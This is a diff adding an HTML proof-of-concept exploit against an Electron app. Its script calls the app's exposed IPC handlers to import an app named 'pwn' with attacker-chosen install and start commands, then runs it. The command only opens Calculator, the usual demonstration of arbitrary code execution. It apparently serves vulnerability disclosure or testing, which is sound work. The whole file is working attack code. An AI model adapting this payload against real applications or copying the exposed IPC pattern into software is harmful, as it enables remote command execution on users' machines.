@@ -1,0 +1,19 @@
+<html>
+<script>
+void (async () => {
+const { apps, appBasePath } = await window.electron.ipcRenderer.invoke('list-apps');
+if (!apps?.length) throw new Error('No apps found');
+const srcApp = apps.at(-1);
+console.log('Source app:', srcApp);
+
+const sourcePath = appBasePath.replace('$APP_BASE_PATH', srcApp.path);
+const { appId } = await window.electron.ipcRenderer.invoke('import-app', {
+    path: sourcePath,
+    appName: 'pwn',
+    installCommand: 'open -a /System/Applications/Calculator.app',
+    startCommand: 'open -a /System/Applications/Calculator.app',
+});
+await window.electron.ipcRenderer.invoke('run-app', { appId });
+})()
+</script>
+</html>
